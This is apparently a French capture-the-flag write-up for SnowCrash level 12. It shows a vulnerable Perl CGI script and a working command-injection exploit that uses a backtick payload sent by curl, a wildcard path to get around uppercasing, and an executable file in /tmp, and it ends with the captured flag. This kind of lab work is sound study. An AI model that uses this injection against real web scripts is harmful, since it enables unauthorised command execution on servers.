# Level 12

Nous avons a disposition un fichier perl

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

La faille a exploiter est le fait que la regex est mal faite, on peut donc faire passer des commandes dans le paramètre x. grace aux backticks.

Si on arrive a lui donner en paramètre x la commande `getflag` on aura le flag.
Mais il y a un probleme, le script met en majuscule le paramètre x, donc on ne peut pas utiliser de minuscule.
La solution est de mettre notre getflag dans un fichier, et de le faire executer par le script.(nom du fichier qui sera mis en majuscule)
Si notre fichier a un nom unique, on peut utiliser "\*" pour remplacer le path, donc en creant un fichier dans /tmp/FREE_TOKEN, on peut faire passer la commande `getflag > /tmp/FREE_TOKEN` et passer en argument x le fichier /\*/FREE_TOKEN

```bash
level12@SnowCrash:~$ echo "getflag > /tmp/FREE_TOKEN" > /tmp/FREE_TOKEN && chmod 777 /tmp/FREE_TOKEN
level12@SnowCrash:~$ curl localhost:4646?x='`/*/FREE_TOKEN`' && cat /tmp/FREE_TOKEN
..Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
